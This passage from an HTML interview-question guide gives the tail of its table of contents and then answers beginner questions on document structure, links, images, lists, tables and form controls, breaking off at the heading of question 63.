- [347: How does focus work when a modal dialog opens and closes?](#347-how-does-focus-work-when-a-modal-dialog-opens-and-closes)
- [348: How were accessible modals built before `<dialog>`, and what did they need?](#348-how-were-accessible-modals-built-before-dialog-and-what-did-they-need)
- [349: What is the customizable `<select>`?](#349-what-is-the-customizable-select)
- [350: When would you build a custom combobox, and what does it need?](#350-when-would-you-build-a-custom-combobox-and-what-does-it-need)
- [351: What is roving tabindex?](#351-what-is-roving-tabindex)
- [352: What is `aria-activedescendant` and when do you use it instead of moving focus?](#352-what-is-aria-activedescendant-and-when-do-you-use-it-instead-of-moving-focus)
- [353: What are common mistakes with live regions?](#353-what-are-common-mistakes-with-live-regions)
- [354: What is the accessibility tree?](#354-what-is-the-accessibility-tree)
- [355: How does the browser compute an accessible name in detail?](#355-how-does-the-browser-compute-an-accessible-name-in-detail)
- [356: What does `role="presentation"` or `role="none"` do?](#356-what-does-rolepresentation-or-rolenone-do)
- [357: Can CSS change the semantics of HTML?](#357-can-css-change-the-semantics-of-html)
- [358: How do you mark up a complex data table with multi-level headers?](#358-how-do-you-mark-up-a-complex-data-table-with-multi-level-headers)
- [359: Which WCAG requirements are mostly handled in HTML?](#359-which-wcag-requirements-are-mostly-handled-in-html)
- [360: Why do screen readers behave differently, and how do you test across them?](#360-why-do-screen-readers-behave-differently-and-how-do-you-test-across-them)
- [361: How do you make password manager and autofill work well?](#361-how-do-you-make-password-manager-and-autofill-work-well)
- [362: How do passkeys work with HTML forms?](#362-how-do-passkeys-work-with-html-forms)
- [363: How do one-time codes work with `autocomplete` and the WebOTP API?](#363-how-do-one-time-codes-work-with-autocomplete-and-the-webotp-api)
- [364: How do form-associated custom elements take part in validation?](#364-how-do-form-associated-custom-elements-take-part-in-validation)
- [365: When should form validation errors be shown?](#365-when-should-form-validation-errors-be-shown)
- [366: What is implicit submission?](#366-what-is-implicit-submission)
- [367: How do you handle forms with multiple submit buttons?](#367-how-do-you-handle-forms-with-multiple-submit-buttons)
- [368: How does form reset work?](#368-how-does-form-reset-work)
- [369: How do you prevent a form from being submitted twice?](#369-how-do-you-prevent-a-form-from-being-submitted-twice)
- [370: What is the `formdata` event?](#370-what-is-the-formdata-event)
- [371: What advanced file input features are there?](#371-what-advanced-file-input-features-are-there)
- [372: Why must you always validate on the server even with HTML validation?](#372-why-must-you-always-validate-on-the-server-even-with-html-validation)
- [373: How does the browser pick an image from `srcset` and `sizes`?](#373-how-does-the-browser-pick-an-image-from-srcset-and-sizes)
- [374: What is `sizes="auto"`?](#374-what-is-sizesauto)
- [375: What is the best way to load the LCP image?](#375-what-is-the-best-way-to-load-the-lcp-image)
- [376: How do you preload a responsive image?](#376-how-do-you-preload-a-responsive-image)
- [377: How do you preload web fonts correctly?](#377-how-do-you-preload-web-fonts-correctly)
- [378: What is HTTP 103 Early Hints?](#378-what-is-http-103-early-hints)
- [379: What are speculation rules?](#379-what-are-speculation-rules)
- [380: What is the back/forward cache and what HTML or headers break it?](#380-what-is-the-backforward-cache-and-what-html-or-headers-break-it)
- [381: How do you use `fetchpriority` with scripts and preloads?](#381-how-do-you-use-fetchpriority-with-scripts-and-preloads)
- [382: How does `content-visibility` work with HTML to speed up long pages?](#382-how-does-content-visibility-work-with-html-to-speed-up-long-pages)
- [383: How do you handle a very large DOM?](#383-how-do-you-handle-a-very-large-dom)
- [384: What is HTML streaming and why does it help?](#384-what-is-html-streaming-and-why-does-it-help)
- [385: How can invalid HTML nesting cause hydration errors?](#385-how-can-invalid-html-nesting-cause-hydration-errors)
- [386: What are the HTML differences between SSR and client-side rendering?](#386-what-are-the-html-differences-between-ssr-and-client-side-rendering)
- [387: What is the "HTML over the wire" approach?](#387-what-is-the-html-over-the-wire-approach)
- [388: How does Google handle JavaScript-rendered content?](#388-how-does-google-handle-javascript-rendered-content)
- [389: What are common canonical tag mistakes?](#389-what-are-common-canonical-tag-mistakes)
- [390: How do you set up `hreflang` for a site with many languages and regions?](#390-how-do-you-set-up-hreflang-for-a-site-with-many-languages-and-regions)
- [391: How do you test structured data?](#391-how-do-you-test-structured-data)
- [392: Why is `user-scalable=no` in the viewport meta a problem?](#392-why-is-user-scalableno-in-the-viewport-meta-a-problem)
- [393: What do iframes cost in performance, and what are facades?](#393-what-do-iframes-cost-in-performance-and-what-are-facades)
- [394: How do you serve different videos for different screen sizes?](#394-how-do-you-serve-different-videos-for-different-screen-sizes)
- [395: When should you replace an animated GIF with a video?](#395-when-should-you-replace-an-animated-gif-with-a-video)
- [396: What does a WebVTT file look like?](#396-what-does-a-webvtt-file-look-like)
- [397: How does the browser figure out the character encoding of a page?](#397-how-does-the-browser-figure-out-the-character-encoding-of-a-page)
- [398: What is MIME sniffing and how do you stop it?](#398-what-is-mime-sniffing-and-how-do-you-stop-it)
- [399: What are quirks mode, limited-quirks mode and no-quirks mode?](#399-what-are-quirks-mode-limited-quirks-mode-and-no-quirks-mode)
- [400: Why is there a gap between inline-block elements, and how is that related to HTML?](#400-why-is-there-a-gap-between-inline-block-elements-and-how-is-that-related-to-html)
- [401: What edge cases exist with character references?](#401-what-edge-cases-exist-with-character-references)
- [402: How are relative URLs resolved, and what goes wrong with `<base>`?](#402-how-are-relative-urls-resolved-and-what-goes-wrong-with-base)
- [403: What is `document.domain` and why is setting it deprecated?](#403-what-is-documentdomain-and-why-is-setting-it-deprecated)
- [404: How do you safely receive messages from `postMessage`?](#404-how-do-you-safely-receive-messages-from-postmessage)
- [405: What are the trade-offs between web components and framework components?](#405-what-are-the-trade-offs-between-web-components-and-framework-components)
- [406: What are scoped custom element registries?](#406-what-are-scoped-custom-element-registries)
- [407: What are JSON and CSS module imports?](#407-what-are-json-and-css-module-imports)
- [408: How do you style the inside of a web component from outside?](#408-how-do-you-style-the-inside-of-a-web-component-from-outside)
- [409: What is `delegatesFocus` in Shadow DOM?](#409-what-is-delegatesfocus-in-shadow-dom)
- [410: How do events behave when they cross a shadow boundary?](#410-how-do-events-behave-when-they-cross-a-shadow-boundary)
- [411: How does light DOM vs shadow DOM content affect SEO?](#411-how-does-light-dom-vs-shadow-dom-content-affect-seo)
- [412: How would you design the markup for a design-system button component?](#412-how-would-you-design-the-markup-for-a-design-system-button-component)
- [413: Scenario: a page gets a poor accessibility score. How do you approach it?](#413-scenario-a-page-gets-a-poor-accessibility-score-how-do-you-approach-it)
- [414: Scenario: the LCP on a marketing page is slow. What HTML changes do you look at?](#414-scenario-the-lcp-on-a-marketing-page-is-slow-what-html-changes-do-you-look-at)
- [415: Scenario: users complain the page jumps while loading (CLS). What do you check?](#415-scenario-users-complain-the-page-jumps-while-loading-cls-what-do-you-check)
- [416: Scenario: a sign-up form has a high drop-off on mobile. What HTML improvements would you make?](#416-scenario-a-sign-up-form-has-a-high-drop-off-on-mobile-what-html-improvements-would-you-make)
- [417: Scenario: how would you build an accessible tabs component?](#417-scenario-how-would-you-build-an-accessible-tabs-component)
- [418: Scenario: accordion with `<details>` or a custom one?](#418-scenario-accordion-with-details-or-a-custom-one)
- [419: Scenario: how would you implement a tooltip?](#419-scenario-how-would-you-implement-a-tooltip)
- [420: Scenario: how do you make infinite scroll accessible?](#420-scenario-how-do-you-make-infinite-scroll-accessible)
- [421: Scenario: you need to set up a multilingual site. What HTML do you need?](#421-scenario-you-need-to-set-up-a-multilingual-site-what-html-do-you-need)
- [422: Scenario: users can write posts with formatting. How do you show their HTML safely?](#422-scenario-users-can-write-posts-with-formatting-how-do-you-show-their-html-safely)
- [423: Scenario: you need to modernize an old site built with table layouts. How do you approach it?](#423-scenario-you-need-to-modernize-an-old-site-built-with-table-layouts-how-do-you-approach-it)
- [424: Scenario: Google Translate breaks your React app. Why, and what can you do?](#424-scenario-google-translate-breaks-your-react-app-why-and-what-can-you-do)
- [425: Scenario: you see hydration errors that only some users get. What could cause them?](#425-scenario-you-see-hydration-errors-that-only-some-users-get-what-could-cause-them)
- [426: What should you think about for printing HTML pages?](#426-what-should-you-think-about-for-printing-html-pages)
- [427: How do you make a carousel accessible?](#427-how-do-you-make-a-carousel-accessible)
- [428: Why do browsers often ignore `autocomplete="off"`?](#428-why-do-browsers-often-ignore-autocompleteoff)
- [429: What is progressive enhancement in HTML?](#429-what-is-progressive-enhancement-in-html)
- [430: How do you detect support for HTML features in JavaScript?](#430-how-do-you-detect-support-for-html-features-in-javascript)
- [431: What is Baseline?](#431-what-is-baseline)
- [432: How does the browser handle unknown elements?](#432-how-does-the-browser-handle-unknown-elements)
- [433: What are named properties on `window` and `form`, and why can they cause bugs?](#433-what-are-named-properties-on-window-and-form-and-why-can-they-cause-bugs)
- [434: What are the different ways to turn an HTML string into DOM nodes?](#434-what-are-the-different-ways-to-turn-an-html-string-into-dom-nodes)
- [435: When would you use `MutationObserver`?](#435-when-would-you-use-mutationobserver)
- [436: What does `element.moveBefore()` solve?](#436-what-does-elementmovebefore-solve)
- [437: Why does the order of elements in the DOM matter when CSS can reorder them?](#437-why-does-the-order-of-elements-in-the-dom-matter-when-css-can-reorder-them)
- [438: How does the `inert` attribute differ from `aria-hidden` plus `tabindex="-1"`?](#438-how-does-the-inert-attribute-differ-from-aria-hidden-plus-tabindex-1)
- [439: What is the difference between `<a href>` and `<a>` without `href`?](#439-what-is-the-difference-between-a-href-and-a-without-href)
- [440: What is the `ping` attribute on links?](#440-what-is-the-ping-attribute-on-links)
- [441: What are hidden performance traps in HTML?](#441-what-are-hidden-performance-traps-in-html)
- [442: What is `<link rel="expect">`?](#442-what-is-link-relexpect)
- [443: What are cross-document View Transitions, and what HTML/CSS do they need?](#443-what-are-cross-document-view-transitions-and-what-htmlcss-do-they-need)
- [444: How do you keep up with changes to HTML?](#444-how-do-you-keep-up-with-changes-to-html)
- [445: Which common UI patterns can now be built with HTML only?](#445-which-common-ui-patterns-can-now-be-built-with-html-only)
- [446: What are the trade-offs of using native elements instead of custom components?](#446-what-are-the-trade-offs-of-using-native-elements-instead-of-custom-components)
- [447: What does "the HTML spec is a living standard" mean for your work?](#447-what-does-the-html-spec-is-a-living-standard-mean-for-your-work)
- [448: Walk through what happens, from an HTML point of view, when a user types a URL and presses Enter.](#448-walk-through-what-happens-from-an-html-point-of-view-when-a-user-types-a-url-and-presses-enter)
- [449: What is the difference between `hidden` on an element and removing it from the DOM?](#449-what-is-the-difference-between-hidden-on-an-element-and-removing-it-from-the-dom)
- [450: What would you check when reviewing the HTML of a new page?](#450-what-would-you-check-when-reviewing-the-html-of-a-new-page)

---

## Easy Questions (1-150)

### 1: What is HTML?

HTML (HyperText Markup Language) is the language used to describe the structure and content of web pages. You write elements like headings, paragraphs, links, images and forms, and the browser turns them into a page.

HTML is not a programming language. It has no variables, loops or logic. It only says "this is a heading", "this is a list", "this is a link to another page". CSS handles how it looks and JavaScript handles behavior.

### 2: What is the difference between HTML and HTML5?

HTML5 was the name for the big update to HTML that came out around 2008-2014. It added semantic elements (`<header>`, `<nav>`, `<article>`), native `<audio>` and `<video>`, `<canvas>`, new input types, the simple `<!DOCTYPE html>` and many JavaScript APIs.

Today there are no more numbered versions. HTML is a "living standard" that gets updated all the time, so "HTML5" is mostly a marketing term now. When people say HTML5 they usually just mean modern HTML.

### 3: Who maintains the HTML standard?

The WHATWG (Web Hypertext Application Technology Working Group) maintains the HTML Living Standard at `html.spec.whatwg.org`. The group is run by the browser vendors (Apple, Google, Mozilla, Microsoft).

The W3C used to publish its own HTML versions, but since 2019 the W3C and WHATWG agreed that the WHATWG version is the single source of truth.

### 4: What is an HTML element?

An element is a single piece of the page, made of a start tag, some content and an end tag.

```html
<p>This is a paragraph.</p>
```

Here `<p>` is the start tag, `This is a paragraph.` is the content and `</p>` is the end tag. Together they make one `p` element. Elements can contain text, other elements, or both.

### 5: What is the difference between a tag and an element?

A tag is the markup you type, like `<p>` or `</p>`. An element is the whole thing: start tag, content and end tag, and also the object the browser creates in the DOM from it.

People often use the two words as if they mean the same thing, and in interviews that is usually fine, but strictly speaking a tag is just the text in angle brackets.

### 6: What are HTML attributes?

Attributes give extra information about an element. They go inside the start tag as `name="value"` pairs.

```html
<a href="https://example.com" target="_blank">Visit</a>
<img src="cat.jpg" alt="A grey cat sleeping" />
```

`href`, `target`, `src` and `alt` are attributes. Some attributes work on every element (like `id` and `class`), others only make sense on specific elements (like `href` on `<a>`).

### 7: What is a void element?

A void element is an element that cannot have any content, so it has no end tag. Common ones are:

- `<br>`
- `<hr>`
- `<img>`
- `<input>`
- `<meta>`
- `<link>`
- `<source>`
- `<track>`
- `<wbr>`
- `<area>`, `<base>`, `<col>`, `<embed>`

```html
<img src="logo.png" alt="Company logo" /> <input type="text" name="email" />
```

### 8: Do void elements need a closing slash like `<br />`?

No. In HTML, `<br>` and `<br />` mean the same thing. The slash is allowed but ignored by the parser.

The slash comes from XHTML and is also required in JSX, so you will see it a lot. On non-void elements the slash does nothing: `<div />` is treated as `<div>` and the element stays open, which can break your layout.

### 9: What is the DOCTYPE and why do you need it?

The DOCTYPE is the first line of an HTML document:

```html
<!DOCTYPE html>
```

It tells the browser to render the page in standards mode. It is not an HTML element and it is not case-sensitive. Older DOCTYPEs (HTML 4, XHTML) were long and pointed to DTD files, but the modern one is just `<!DOCTYPE html>`.

### 10: What happens if you leave out the DOCTYPE?

The browser switches to quirks mode. In quirks mode it copies old browser bugs from the late 1990s so that very old sites keep working. For example, the box model, table sizing and some line height rules behave differently.

The result is that your CSS may not work as expected. Always add `<!DOCTYPE html>` at the top.

### 11: What is the basic structure of an HTML document?

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>My Page</title>
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <h1>Hello</h1>
    <p>Welcome to my page.</p>
    <script src="app.js" defer></script>
  </body>
</html>
```

`<html>` is the root. `<head>` holds information about the page (title, metadata, links to CSS). `<body>` holds the content the user sees.

### 12: What does the `lang` attribute on `<html>` do?

It says what language the page is written in, using a language code like `en`, `en-US`, `de` or `ka`.

Screen readers use it to pick the right voice and pronunciation. Browsers use it for spell checking, hyphenation, translation offers and choosing fonts for some scripts. Search engines can use it too. It is one of the easiest accessibility wins, so always set it.

### 13: What goes inside the `<head>` element?

Things that describe the page but are not shown as content:

- `<meta charset>` and other `<meta>` tags
- `<title>`
- `<link>` for stylesheets, icons, preloads, canonical URL and so on
- `<style>` for CSS
- `<script>` tags
- `<base>`

The user does not see these directly, except the title in the browser tab.

### 14: What does `<meta charset="utf-8">` do and why should it come first?

It tells the browser which character encoding the file uses, so characters like `é`, `ü`, `ქ` or emoji show up correctly. UTF-8 is the only encoding you should use for new pages.

It should be the first thing in `<head>`, because the browser needs to know the encoding before it reads any text. The spec says it must be within the first 1024 bytes of the file. If it comes too late, the browser may have already guessed wrong and need to re-parse the page.

### 15: What is the viewport meta tag?

```html
<meta name="viewport" content="width=device-width, initial-scale=1" />
```

Without it, mobile browsers pretend the screen is about 980px wide and zoom out, so the page looks tiny. With `width=device-width` the layout width matches the device width, and `initial-scale=1` sets the starting zoom to 100%. You need it for any responsive design.

### 16: What is the `<title>` element used for?

It sets the page title. That text shows:

- In the browser tab
- In bookmarks and history
- As the clickable headline in search results (in most cases)
- As the first thing a screen reader announces when the page loads

Every page should have one unique, descriptive title, for example `Order #1234 - My Shop` instead of just `My Shop`.

### 17: What is the difference between `<head>` and `<header>`?

`<head>` is the part of the document with metadata (title, meta tags, links to CSS). It is not visible content and there is only one.

`<header>` is a visible section of the page that holds introductory content, like a logo, site name and main navigation. You can have several `<header>` elements, for example one for the page and one inside each `<article>`.

### 18: What are heading elements and how should you use them?

HTML has six heading levels, `<h1>` to `<h6>`. `<h1>` is the most important, `<h6>` the least.

Use them to describe the structure of the content, like a table of contents:

```html
<h1>Recipes</h1>
<h2>Breakfast</h2>
<h3>Pancakes</h3>
<h3>Omelette</h3>
<h2>Dinner</h2>
```

Don't pick a heading level because of its font size. Pick it based on structure and change the look with CSS. Try not to skip levels (for example `<h2>` straight to `<h4>`), because screen reader users navigate by headings.

### 19: Can a page have more than one `<h1>`?

Technically yes, the HTML spec allows it. But the common advice is to use one `<h1>` per page that describes the main topic, then `<h2>`, `<h3>` and so on for the parts.

There used to be an "outline algorithm" where each `<section>` could start over with `<h1>`, but no browser or screen reader ever implemented it and it was removed from the spec. So a page full of `<h1>` elements gives screen reader users a flat, confusing structure.

### 20: How does HTML handle whitespace in text?

In normal text, the browser collapses runs of spaces, tabs and new lines into a single space. So this:

```html
<p>Hello world how are you?</p>
```

shows as "Hello world how are you?". If you want to keep whitespace exactly, use `<pre>` or the CSS `white-space` property.

### 21: How do you add a line break and when should you avoid `<br>`?

`<br>` adds a line break inside text. It is fine where the line break is part of the content, like an address or a poem:

```html
<p>
  221B Baker Street<br />
  London<br />
  NW1 6XE
</p>
```

Don't use `<br>` to add space between blocks of content. Use separate elements (like several `<p>`) and CSS margins for that.

### 22: What is `<hr>` for?

`<hr>` means a thematic break between paragraphs, like a change of topic or a scene change in a story. Browsers draw it as a horizontal line by default, but its meaning is the break, not the line. If you only want a line for decoration, use a CSS border.

### 23: How do you create a link?

Use the `<a>` (anchor) element with an `href` attribute:

```html
<a href="https://developer.mozilla.org">MDN Web Docs</a>
<a href="/about">About us</a>
```

The link text should make sense on its own. "Read the pricing guide" is better than "Click here", because screen reader users often jump through a list of links without the text around them.

### 24: What is the difference between absolute and relative URLs?

An absolute URL includes the scheme and domain: `https://example.com/blog/post.html`.

A relative URL is resolved against the current page URL:

- `post.html`: same folder as the current page
- `../images/logo.png`: one folder up
- `/blog/post.html`: from the root of the current site
- `//cdn.example.com/x.js`: same scheme as the current page (rarely used now)

Use relative URLs for links inside your own site and absolute ones for other sites.

### 25: How do you open a link in a new tab?

Add `target="_blank"`:

```html
<a href="https://example.com" target="_blank" rel="noopener noreferrer"
  >Example</a
>
```

`rel="noopener"` stops the new page from getting access to your page through `window.opener`. Modern browsers now apply `noopener` by default for `target="_blank"`, but many teams still add it to be explicit. `noreferrer` also hides the `Referer` header.

Opening new tabs can be confusing for users, so only do it when there is a good reason, like a link inside a form the user is filling in.

### 26: How do you link to a specific part of the same page?

Give the target element an `id`, then link to it with `#` and the id:

```html
<a href="#pricing">Jump to pricing</a>

<h2 id="pricing">Pricing</h2>
```

You can also link to a part of another page: `/docs/setup#install`. A link with `href="#"` scrolls to the top of the page.

### 27: How do you create email and phone links?

```html
<a href="mailto:support@example.com">Email us</a>
<a href="mailto:support@example.com?subject=Help&body=Hi">Email with subject</a>
<a href="tel:+995555123456">Call us</a>
```

`mailto:` opens the user's email app and `tel:` starts a call on phones. On desktop, `tel:` links may do nothing or open an app like FaceTime or Skype.

### 28: How do you add an image to a page?

```html
<img
  src="photo.jpg"
  alt="Two people hiking up a snowy mountain"
  width="800"
  height="600"
/>
```

`src` is the image URL and `alt` is the text alternative. `width` and `height` help the browser reserve space before the image loads. `<img>` is a void element, so it has no closing tag.

### 29: Why is the `alt` attribute important?

`alt` gives a text version of the image. It is used:

- By screen readers, which read it out instead of the image
- When the image fails to load
- By search engines to understand the image

Without `alt`, many screen readers read the file name, like "IMG_4021 dot jpg", which is useless. Every `<img>` should have an `alt` attribute.

### 30: When should `alt` be empty?

When the image is only decoration and adds no information, use `alt=""`:

```html
<img src="divider-flourish.svg" alt="" />
```

An empty `alt` tells screen readers to skip the image. This is different from leaving `alt` out completely, which makes some screen readers read the file name. Also use empty `alt` when the same information is already in the text next to the image, like an icon beside the word "Settings".

### 31: Why should you set `width` and `height` on images?

So the browser knows the image size before it downloads. Browsers use the two values to calculate the aspect ratio and reserve the right amount of space. Without them, the content below jumps down when the image loads, which is called layout shift (and hurts the CLS metric).

You can still make the image responsive with CSS:

```css
img {
  max-width: 100%;
  height: auto;
}
```

The aspect ratio from the attributes is kept.

### 32: What is the difference between ordered and unordered lists?

`<ul>` is an unordered list, where the order of items doesn't matter. It shows bullets by default. `<ol>` is an ordered list, where order matters (like steps). It shows numbers.

```html
<ul>
  <li>Milk</li>
  <li>Eggs</li>
</ul>

<ol>
  <li>Preheat the oven</li>
  <li>Mix the batter</li>
</ol>
```

`<ol>` also supports `start`, `reversed` and `type` attributes. Both lists may only contain `<li>` elements as direct children (plus `<script>` and `<template>`).

### 33: What is a description list?

A description list (`<dl>`) holds groups of terms (`<dt>`) and descriptions (`<dd>`). It works well for glossaries, FAQs or key-value data.

```html
<dl>
  <dt>HTML</dt>
  <dd>The language for page structure.</dd>
  <dt>CSS</dt>
  <dd>The language for page styling.</dd>
</dl>
```

A term can have several descriptions, and several terms can share one description. You can also wrap each group in a `<div>` for styling.

### 34: How do you nest lists?

Put the inner list inside an `<li>` of the outer list:

```html
<ul>
  <li>
    Fruits
    <ul>
      <li>Apple</li>
      <li>Banana</li>
    </ul>
  </li>
  <li>Vegetables</li>
</ul>
```

A common mistake is putting the inner `<ul>` directly inside the outer `<ul>`, next to the `<li>` elements. That is invalid HTML.

### 35: How do you create a table?

```html
<table>
  <tr>
    <th>Name</th>
    <th>Age</th>
  </tr>
  <tr>
    <td>Ana</td>
    <td>28</td>
  </tr>
</table>
```

`<tr>` is a row, `<th>` is a header cell and `<td>` is a data cell. Tables are for tabular data, like a price list or a report. Don't use them to lay out a page.

### 36: What are `<thead>`, `<tbody>` and `<tfoot>`?

They group table rows into the header, body and footer:

```html
<table>
  <thead>
    <tr>
      <th>Item</th>
      <th>Price</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Coffee</td>
      <td>$3</td>
    </tr>
    <tr>
      <td>Tea</td>
      <td>$2</td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <td>Total</td>
      <td>$5</td>
    </tr>
  </tfoot>
</table>
```

They make the structure clear, help with styling and allow the header and footer to repeat on every printed page. If you don't write `<tbody>`, the browser adds one for you in the DOM.

### 37: What is the difference between `<th>` and `<td>`?

`<th>` is a header cell that labels a row or a column. `<td>` is a normal data cell. Screen readers use `<th>` cells to announce the header when the user moves through the table, for example "Price, 3 dollars". Browsers also make `<th>` bold and centered by default.

### 38: What do `colspan` and `rowspan` do?

They make a cell take up more than one column or row:

```html
<table>
  <tr>
    <th colspan="2">Full name</th>
  </tr>
  <tr>
    <td>Ana</td>
    <td>Smith</td>
  </tr>
</table>
```

`colspan="2"` makes the cell two columns wide. `rowspan="3"` makes it three rows tall. Use them only when the data really needs it, because complex tables are harder to read with a screen reader.

### 39: What is the `<caption>` element?

`<caption>` gives a table a title. It must be the first child of `<table>`.

```html
<table>
  <caption>
    Monthly sales in 2026
  </caption>
  ...
</table>
```

Screen readers announce the caption when the user reaches the table, so they know what the table is about before reading the cells.

### 40: What is an HTML form?

A form collects input from the user and sends it somewhere, usually to a server.

```html
<form action="/subscribe" method="post">
  <label for="email">Email</label>
  <input id="email" name="email" type="email" required />
  <button type="submit">Subscribe</button>
</form>
```

When the user submits, the browser collects the values of the named fields and sends them to the `action` URL using the `method`.

### 41: What do the `action` and `method` attributes on a form do?

`action` is the URL where the form data is sent. If you leave it out, the form submits to the current page URL.

`method` is the HTTP method: `get` or `post`. There is also `dialog`, which closes a `<dialog>` instead of sending anything. If you leave `method` out, it defaults to `get`.

### 42: What is the difference between GET and POST for forms?

With `GET`, the form data goes into the URL as a query string, like `/search?q=shoes&size=42`. The URL can be bookmarked and shared, and there is a practical length limit. Use it for searches and filters that don't change anything.

With `POST`, the data goes in the request body. Use it for actions that change data (sign up, place order, upload a file), and for sensitive data like passwords, which should never end up in URLs, logs or browser history.

### 43: What does the `name` attribute do on form fields?

`name` is the key used when the form data is sent. Fields without a `name` are not sent at all.

```html
<input name="city" value="Tbilisi" />
```

This sends `city=Tbilisi`. Radio buttons use the same `name` to form a group. In JavaScript you can also use `name` to get fields, for example `form.elements.city`.

### 44: What are the common `<input>` types?

- `text`, `password`, `email`, `url`, `tel`, `search`
- `number`, `range`
- `date`, `time`, `datetime-local`, `month`, `week`
- `checkbox`, `radio`
- `file`
- `color`
- `hidden`
- `submit`, `reset`, `button`, `image`

If you leave `type` out, or use a type the browser doesn't know, it falls back to `text`.

### 45: What is the `<label>` element and why is it important?

`<label>` gives a form field a visible name that is linked to the field. This matters because:

- Screen readers read the label when the field gets focus.
- Clicking the label focuses the field (or toggles a checkbox), which gives a bigger click area.
- Voice control users can say "click Email" to reach the field.

Every form field needs a label.

### 46: What are the two ways to link a label to a field?

Explicit, with `for` pointing to the field's `id`:

```html
<label for="username">Username</label> <input id="username" name="username" />
```

Implicit, by wrapping the field:

```html
<label>
  Username
  <input name="username" />
</label>
```

Both work. The explicit way works in more assistive tech and lets you place the label anywhere in the markup. You can also use both together.

### 47: Why isn't a placeholder a replacement for a label?

The `placeholder` text disappears as soon as the user starts typing, so they can forget what the field was for. It usually has low contrast, some screen readers don't read it reliably, and it can look like the field is already filled in.

Use a real `<label>` for the name of the field and use `placeholder` only for a short example, like `e.g. 0555 12 34 56`.

### 48: What is a `<textarea>`?

A multi-line text field:

```html
<label for="message">Message</label>
<textarea
  id="message"
  name="message"
  rows="5"
  cols="40"
  maxlength="500"
></textarea>
```

Unlike `<input>`, it has an end tag and the default value goes between the tags, not in a `value` attribute. Any whitespace between the tags becomes part of the value, so keep the tags tight.

### 49: How do you create a dropdown?

Use `<select>` with `<option>` elements:

```html
<label for="country">Country</label>
<select id="country" name="country">
  <option value="">Choose a country</option>
  <option value="ge">Georgia</option>
  <option value="de" selected>Germany</option>
</select>
```

`value` is what gets sent. The text between the tags is what the user sees. `selected` picks the default option. Add `multiple` to let the user pick more than one.

### 50: What is `<optgroup>`?

It groups options inside a `<select>` under a label:

```html
<select name="car">
  <optgroup label="German">
    <option>Audi</option>
    <option>BMW</option>
  </optgroup>
  <optgroup label="Japanese">
    <option>Honda</option>
  </optgroup>
</select>
```

The group label is shown but can't be selected. You can disable a whole group with `disabled`.

### 51: How do you group radio buttons?

Give them the same `name`. Only one radio in a group can be checked at a time.

```html
<fieldset>
  <legend>Delivery</legend>
  <label
    ><input type="radio" name="delivery" value="standard" checked />
    Standard</label
  >
  <label><input type="radio" name="delivery" value="express" /> Express</label>
</fieldset>
```

The `value` of the checked radio is what gets sent. Wrapping the group in `<fieldset>` with a `<legend>` gives the group a name that screen readers announce.

### 52: How do checkboxes work?

A checkbox is an on/off field. Each checkbox works on its own, so the user can check any number of them.

```html
<label
  ><input type="checkbox" name="newsletter" value="yes" /> Send me the
  newsletter</label
>
```

When checked, it sends `newsletter=yes`. If you leave `value` out, it sends `on`. When unchecked, nothing is sent for that field at all. Use `checked` to make it checked by default.

### 53: What is the `<button>` element and what types does it have?

`<button>` creates a clickable button. It has three types:

- `submit`: submits the form it belongs to
- `reset`: resets all fields in the form to their default values
- `button`: does nothing by default, you add behavior with JavaScript

```html
<button type="submit">Save</button>
<button type="button" onclick="openHelp()">Help</button>
```

Unlike `<input type="submit">`, a `<button>` can contain other HTML, like an icon and text.

### 54: What is the default type of a `<button>` inside a form?

`submit`. This surprises a lot of people. If you add a button inside a form for something like "Show password" and forget `type="button"`, clicking it submits the form.

Always set `type` on buttons. A good habit is `type="button"` for anything that is not meant to submit.

### 55: What is the difference between `<input type="submit">` and `<button type="submit">`?

Both submit the form. The difference:

- `<input type="submit" value="Send">` can only show plain text from its `value`.
- `<button type="submit">` can contain HTML, like `<svg>` icons or `<span>` elements, and is easier to style.

Most projects use `<button>` today.

### 56: What does the `required` attribute do?

It marks a field as mandatory. If the field is empty when the user submits, the browser stops the submit, focuses the field and shows a message.

```html
<input type="email" name="email" required />
```

This is client-side validation for convenience only. Users can turn it off or send requests directly, so the server must always check the data too.

### 57: What is the difference between `disabled` and `readonly`?

- `readonly`: the user can't change the value, but can focus it, select and copy the text. The value **is** sent with the form.
- `disabled`: the user can't interact with it at all, it can't get focus, it is usually greyed out, and its value **is not** sent with the form.

`readonly` only works on text-like inputs and `<textarea>`. `disabled` works on all form controls, buttons and `<fieldset>`.

### 58: How do you set a default value for form fields?

It depends on the field:

```html
<input name="city" value="Tbilisi" />
<textarea name="bio">Default text</textarea>
<input type="checkbox" name="terms" checked />
<select name="size">
  <option>S</option>
  <option selected>M</option>
</select>
```

The `value` attribute is the default value. When the user types, the current value changes but the attribute stays the same. A reset button brings back the defaults.

### 59: What are `<fieldset>` and `<legend>`?

`<fieldset>` groups related fields and `<legend>` gives the group a caption.

```html
<fieldset>
  <legend>Shipping address</legend>
  <label for="street">Street</label>
  <input id="street" name="street" />
  <label for="zip">ZIP code</label>
  <input id="zip" name="zip" />
</fieldset>
```

Screen readers announce the legend when the user enters the group. Adding `disabled` to a `<fieldset>` disables every field inside it.

### 60: What is semantic HTML?

Semantic HTML means using elements that describe what the content is, not how it looks. For example, `<nav>` for navigation, `<button>` for buttons, `<h2>` for a section heading, `<ul>` for a list.

The opposite is building everything from `<div>` and `<span>` with classes like `class="button"` or `class="header"`. That looks the same with CSS but means nothing to browsers, screen readers or search engines.

### 61: Why does semantic HTML matter?

- **Accessibility**: screen readers use elements to announce roles ("button", "list with 5 items", "navigation") and to let users jump between headings and landmarks.
- **Free behavior**: a `<button>` is focusable and works with Enter and Space without extra code. A `<div>` is not.
- **SEO**: search engines understand headings, links and main content better.
- **Readability**: other developers can understand the structure of the page faster.
- **Less code**: you don't have to rebuild what the browser already gives you.

### 62: What are the `<header>` and `<footer>` elements?

`<header>` holds introductory content for the page or for a section, like a logo, title or navigation. `<footer>` holds closing content, like copyright, contact links or the author and date of an article.

```html
<article>
  <header>
    <h2>How to brew coffee</h2>
    <p>By Nino, <time datetime="2026-03-01">March 1, 2026</time></p>
  </header>
  <p>...</p>
  <footer>Tags: coffee, guides</footer>
</article>
```

When they are direct children of `<body>` (not inside `<article>`, `<section>` etc.), they get the `banner` and `contentinfo` landmark roles.

### 63: What is the `<nav>` element for?

